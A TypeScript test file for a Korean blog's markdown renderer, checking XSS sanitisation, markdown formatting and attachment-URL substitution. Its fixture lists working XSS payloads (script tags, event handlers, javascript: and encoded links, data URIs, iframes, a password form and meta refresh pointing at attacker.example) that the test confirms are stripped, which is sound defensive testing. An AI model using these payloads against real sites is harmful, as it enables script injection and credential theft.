import type { PostDetailAttachmentPresignedUrlResponse } from '@/shared/api/generated';
import { renderPostMarkdown } from '@/shared/lib/markdown/render-post-markdown';

function renderHtml(markdown: string, attachmentPresignedUrls: PostDetailAttachmentPresignedUrlResponse[] = []) {
  const container = document.createElement('div');
  container.innerHTML = renderPostMarkdown(markdown, attachmentPresignedUrls);
  document.body.append(container);

  return container;
}

function hasCodeBlock(container: HTMLElement, language: string, text: string) {
  return Array.from(container.querySelectorAll(`pre code.language-${language}`)).some((code) =>
    code.textContent?.includes(text),
  );
}

const mixedXssContent = `
# 안전한 제목

정상 **강조**와 [안전한 링크](https://techtaurant.com/ko)가 함께 있어야 합니다.

<details open onclick="alert('details')"><summary>안전한 상세</summary><span class="badge" style="color:red">내용</span></details>

| 안전한 표 |
| --- |
| 값 |

<script>alert('script')</script>
<img src="https://example.com/safe.png" alt="안전한 이미지" onerror="alert('image')">
<svg><g onload="alert('svg')"></g></svg>
<math><mi//xlink:href="data:x,<script>alert('math')</script>"></math>
<iframe src="https://attacker.example"></iframe>
<object data="javascript:alert('object')"></object>
<form action="https://attacker.example"><input name="password"><button formaction="https://attacker.example">전송</button></form>
<base href="https://attacker.example"><meta http-equiv="refresh" content="0;url=https://attacker.example">
<a href="javascript:alert('raw-link')">위험 링크</a>
<a href="&#x6a;avascript:alert('encoded-link')">인코딩 링크</a>
<img src="data:text/html,<script>alert('data-uri')</script>" alt="위험 이미지">

[마크다운 위험 링크](JaVaScRiPt:alert('markdown-link'))

\`<img src=x onerror=alert('inline-code')>\`

\`\`\`html
<img src=x onerror=alert('code-block')>
<script>alert('code-block')</script>
\`\`\`
`;

const markdownRenderingContent = `
# HTTP 메시지의 흐름

> **핵심**: \`await\`는 이벤트 루프를 멈추지 않습니다.

[Node.js 공식 문서](https://nodejs.org/en/learn/asynchronous-work/dont-block-the-event-loop)

![구조도](/images/node-event-loop.png)

| 실행 계층 | 처리 대상 |
| --- | --- |
| microtask | Promise reaction |
| timers | setTimeout callback |

1. 요청을 받습니다.
2. 비동기 작업을 예약합니다.

- \`process.nextTick()\`을 확인합니다.
- Promise queue를 비웁니다.

<details open><summary>추가 설명</summary><span class="badge">안전한 raw HTML</span></details>

\`\`\`http
GET /posts HTTP/1.1
Host: api.techtaurant.com
\`\`\`

\`\`\`js
process.nextTick(() => console.log('next tick'));
\`\`\`

\`\`\`java
@GetMapping("/posts")
public List<Post> posts() { return List.of(); }
\`\`\`

\`\`\`mermaid
flowchart TD
  A[Request] --> B[Response<br/>HTML literal]
\`\`\`

\`\`\`bash
pnpm test
\`\`\`
`;

const FIRST_ATTACHMENT_ID = '11111111-1111-4111-8111-111111111111';
const SECOND_ATTACHMENT_ID = '22222222-2222-4222-8222-222222222222';
const UNMAPPED_ATTACHMENT_ID = '33333333-3333-4333-8333-333333333333';
const FIRST_PRESIGNED_URL = 'https://storage.example.com/posts/first.png?signature=first';
const SECOND_PRESIGNED_URL = 'https://storage.example.com/posts/second.png?signature=second';

const attachmentPresignedUrls: PostDetailAttachmentPresignedUrlResponse[] = [
  { attachmentId: FIRST_ATTACHMENT_ID, presignedUrl: FIRST_PRESIGNED_URL },
  { attachmentId: SECOND_ATTACHMENT_ID, presignedUrl: SECOND_PRESIGNED_URL },
];

const attachmentImageContent = `
![본문 이미지](${FIRST_ATTACHMENT_ID})

- ![목록 안 이미지](${SECOND_ATTACHMENT_ID})
`;

const unmappedAttachmentImageContent = `![삭제된 이미지](${UNMAPPED_ATTACHMENT_ID})`;

const attachmentIdInCodeContent = `
\`![인라인 코드 이미지](${FIRST_ATTACHMENT_ID})\`

\`\`\`md
![코드 블록 이미지](${FIRST_ATTACHMENT_ID})
\`\`\`
`;

describe('게시물 마크다운 렌더러', () => {
  afterEach(() => {
    document.body.replaceChildren();
  });

  describe('XSS 방지', () => {
    it('다양한 XSS payload가 섞인 본문에서 안전한 서식만 남긴다', () => {
      const container = renderHtml(mixedXssContent);

      expect(container.querySelector('h1')).toHaveTextContent('안전한 제목');
      expect(container.querySelector('strong')).toHaveTextContent('강조');
      expect(container.querySelector('a[href="https://techtaurant.com/ko"]')).toHaveTextContent('안전한 링크');
      expect(container.querySelector('details')).toHaveAttribute('open');
      expect(container.querySelector('summary')).toHaveTextContent('안전한 상세');
      expect(container.querySelector('span')).toHaveClass('badge');
      expect(container.querySelector('table')).toBeInTheDocument();
      expect(container.querySelector('img[src="https://example.com/safe.png"]')).toHaveAttribute(
        'alt',
        '안전한 이미지',
      );

      expect(
        container.querySelectorAll(
          'script, svg, math, iframe, object, embed, form, input, button, base, meta, [onerror], [onload], [onclick], [style], [xlink\\:href]',
        ),
      ).toHaveLength(0);
      expect(
        container.querySelectorAll('[href*="javascript" i], [src*="javascript" i], [src^="data:" i]'),
      ).toHaveLength(0);
      expect(container.querySelector('code')).toHaveTextContent("<img src=x onerror=alert('inline-code')>");
      expect(container.querySelector('pre code')).toHaveTextContent("<script>alert('code-block')</script>");
      expect(container.querySelector('pre img, pre script, code img')).not.toBeInTheDocument();
    });
  });

  describe('실데이터 렌더링', () => {
    it('다양한 마크다운 서식을 HTML로 변환한다', () => {
      const container = renderHtml(markdownRenderingContent);

      expect(container.querySelector('h1')).toHaveTextContent('HTTP 메시지의 흐름');
      expect(container.querySelector('blockquote')).toHaveTextContent('await는 이벤트 루프를 멈추지 않습니다.');
      expect(
        container.querySelector('a[href="https://nodejs.org/en/learn/asynchronous-work/dont-block-the-event-loop"]'),
      ).toHaveTextContent('Node.js 공식 문서');
      expect(container.querySelector('img[src="/images/node-event-loop.png"]')).toHaveAttribute('alt', '구조도');
      expect(container.querySelectorAll('ul, ol')).toHaveLength(2);
      expect(container.querySelector('table')).toBeInTheDocument();
      expect(container.querySelector('table th')).toHaveTextContent('실행 계층');

      expect(container.querySelector('details')).toHaveAttribute('open');
      expect(container.querySelector('summary')).toHaveTextContent('추가 설명');
      expect(container.querySelector('span')).toHaveClass('badge');
      expect(hasCodeBlock(container, 'http', 'GET /posts HTTP/1.1')).toBe(true);
      expect(hasCodeBlock(container, 'js', 'process.nextTick')).toBe(true);
      expect(hasCodeBlock(container, 'java', '@GetMapping')).toBe(true);
      expect(hasCodeBlock(container, 'mermaid', 'flowchart TD')).toBe(true);
      expect(hasCodeBlock(container, 'bash', 'pnpm test')).toBe(true);
      expect(hasCodeBlock(container, 'mermaid', '<br/>')).toBe(true);
      expect(container.querySelector('pre code.language-mermaid br')).not.toBeInTheDocument();
    });
  });

  describe('첨부 이미지', () => {
    it('본문의 attachmentId를 presigned URL로 치환하고 alt를 유지한다', () => {
      const container = renderHtml(attachmentImageContent, attachmentPresignedUrls);

      expect(container.querySelector(`img[src="${FIRST_PRESIGNED_URL}"]`)).toHaveAttribute('alt', '본문 이미지');
      expect(container.querySelector(`li img[src="${SECOND_PRESIGNED_URL}"]`)).toHaveAttribute('alt', '목록 안 이미지');
    });

    it('매핑에 없는 attachmentId는 src를 남기지 않는다', () => {
      const container = renderHtml(unmappedAttachmentImageContent, attachmentPresignedUrls);

      expect(container.querySelector('img')).toHaveAttribute('alt', '삭제된 이미지');
      expect(container.querySelector('img')).not.toHaveAttribute('src');
    });

    it('코드 블록과 인라인 코드 안의 attachmentId는 치환하지 않는다', () => {
      const container = renderHtml(attachmentIdInCodeContent, attachmentPresignedUrls);

      expect(container.querySelector('code')).toHaveTextContent(FIRST_ATTACHMENT_ID);
      expect(container.querySelector('pre code')).toHaveTextContent(FIRST_ATTACHMENT_ID);
      expect(container.querySelector('img')).not.toBeInTheDocument();
    });

    it('치환한 URL도 sanitize 대상이므로 허용되지 않은 스킴은 제거한다', () => {
      const container = renderHtml(`![위험 이미지](${FIRST_ATTACHMENT_ID})`, [
        { attachmentId: FIRST_ATTACHMENT_ID, presignedUrl: "javascript:alert('attachment')" },
      ]);

      expect(container.querySelector('img')).not.toHaveAttribute('src');
    });
  });
});
